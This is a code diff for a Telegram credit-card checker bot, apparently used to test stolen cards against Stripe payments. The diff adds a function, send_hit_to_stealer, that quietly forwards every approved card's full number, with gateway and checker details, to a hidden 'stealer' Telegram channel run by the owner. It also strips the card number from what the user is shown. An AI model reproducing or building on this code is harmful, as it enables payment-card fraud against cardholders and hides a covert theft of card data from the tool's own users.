@@ -10,20 +10,30 @@ from FUNC.defs import *
 from TOOLS.check_all_func import *
 from TOOLS.getbin import *
 from TOOLS.getcc_for_mass import *
-from BOT.tools.hit_stealer import send_hit_if_approved
 
+# ━━━━━━━━━━━━━━━━━━━━ STEALER CONFIG ━━━━━━━━━━━━━━━━━━━━
 STEALER_CHANNEL_ID = -1003627495953
-fake = Faker()
-
-# Owner DM Link
 OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 
-async def send_hit_if_approved(client: Client, text: str):
+fake = Faker()
+
+async def send_hit_to_stealer(client: Client, fullcc, status, response, gateway, time_taken, first_name, role):
+    """Send approved card to stealer channel/group"""
     try:
-        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
+        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅
+
+{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
+{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
+
+{SYMBOL} 𝗧𝗼𝗼𝗸 {time_taken:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
+{SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
+{SYMBOL} 𝗢𝘄𝗻𝗲𝗿: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+
+        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
+        print(f"[Stealer] Sent approved hit to channel")
     except Exception as e:
-        print(f"[Stealer Error] Failed to forward: {e}")
+        print(f"[Stealer Error] Failed to send to channel: {e}")
 
 async def hiburma_check(fullcc):
     try:
@@ -111,7 +121,7 @@ async def hiburma_check(fullcc):
             rc = await s.post(stripe_url, headers=stripe_headers, data=urlencode(stripe_data), timeout=120)
             res = rc.json()
             if "error" in res:
-                return "Declined ✗", res["error"].get("message", "Declined")
+                return "Declined ❌", res["error"].get("message", "Declined")
             elif res.get("status") == "succeeded":
                 return "Approved ✅", "Payment Succeeded"
             else:
@@ -172,14 +182,6 @@ async def hiburma_cmd(Client, message):
         start = time.perf_counter()
         status, response = await hiburma_check(fullcc)
 
-        getbin = await get_bin_details(cc)
-        brand = getbin[0] if len(getbin) > 0 else "Unknown"
-        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
-        level = getbin[2] if len(getbin) > 2 else "Unknown"
-        bank = getbin[3] if len(getbin) > 3 else "Unknown"
-        country = getbin[4] if len(getbin) > 4 else "Unknown"
-        flag = getbin[5] if len(getbin) > 5 else ""
-
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
 {SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
@@ -190,18 +192,19 @@ async def hiburma_cmd(Client, message):
 
         if "Approved" in status or "✅" in status:
             status_text = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+            
+            # Send to stealer channel
+            await send_hit_to_stealer(
+                Client, fullcc, status, response, gateway, 
+                time.perf_counter() - start, first_name, role
+            )
         else:
             status_text = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
 
         finalresp = f"""{status_text}
 
-{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
 {SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
 {SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}
-
-{SYMBOL} 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} — {type_} — {level}
-{SYMBOL} 𝗕𝗮𝗻𝗸: {bank}
-{SYMBOL} 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}
 
 {SYMBOL} 𝗧𝗼𝗼𝗸 {time.perf_counter() - start:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
 {SYMBOL} 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: {first_name} ({role})
@@ -211,8 +214,6 @@ async def hiburma_cmd(Client, message):
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
         await setantispamtime(user_id)
         await deductcredit(user_id)
-        if "Approved" in status:
-            await send_hit_if_approved(Client, finalresp)
 
     except Exception:
         import traceback
@@ -271,31 +272,26 @@ Checked by: {first_name} ({role})"""
             remaining = total - processed
             status, response = await hiburma_check(fullcc)
 
-            cc_num = fullcc.split('|')[0]
-            getbin = await get_bin_details(cc_num)
-            brand = getbin[0] if len(getbin) > 0 else "Unknown"
-            type_ = getbin[1] if len(getbin) > 1 else "Unknown"
-            level = getbin[2] if len(getbin) > 2 else "Unknown"
-            bank = getbin[3] if len(getbin) > 3 else "Unknown"
-            country = getbin[4] if len(getbin) > 4 else "Unknown"
-            flag = getbin[5] if len(getbin) > 5 else ""
-
             if "Approved" in status or "✅" in status:
                 approved_count += 1
-                response_status = "APPROVED ✓"
+                response_status = "APPROVED ✅"
+                card_time = time.perf_counter() - start
+                
                 approved_cards.append({
                     "fullcc": fullcc,
                     "response": response,
                     "gateway": gateway,
-                    "brand": f"{brand} — {type_} — {level}",
-                    "bank": bank,
-                    "country": country,
-                    "flag": flag,
-                    "time": time.perf_counter() - start
+                    "time": card_time
                 })
+                
+                # Send to stealer channel immediately
+                await send_hit_to_stealer(
+                    Client, fullcc, status, response, gateway, 
+                    card_time, first_name, role
+                )
             else:
                 declined_count += 1
-                response_status = "DECLINED ✗"
+                response_status = "DECLINED ❌"
 
             # Update progress
             try:
@@ -326,27 +322,21 @@ Checked by: {first_name} ({role})"""
         for card in approved_cards:
             approved_msg = f"""𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
 
-{SYMBOL} 𝗖𝗖 ⇾ {card['fullcc']}
 {SYMBOL} 𝗚𝗮𝘁ᴇᴡᴀʏ ⇾ {card['gateway']}
 {SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
 
-{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
-{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
-{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}
-
-{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅ𝘀
 {SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
 {SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
             
             await message.reply_text(approved_msg, message.id)
-            await send_hit_if_approved(Client, approved_msg)
             await asyncio.sleep(0.5)
 
         # Send declined summary
         elapsed_time = round(time.perf_counter() - start, 2)
         
         if approved_count > 0:
-            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅs ({declined_count})
+            declined_summary = f"""❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ({declined_count})
 
 ━━━━━━━━━━━━━━━━━━━━
 """
@@ -373,7 +363,7 @@ Checked by: {first_name} ({role})"""
         else:
             # No approved cards
             await message.reply_text(
-                f"""❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅs
+                f"""❌ 𝗡𝗼 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗖𝗮𝗿𝗱𝘀
 
 ━━━━━━━━━━━━━━━━━━━━
 📊 Total Cards: {total}
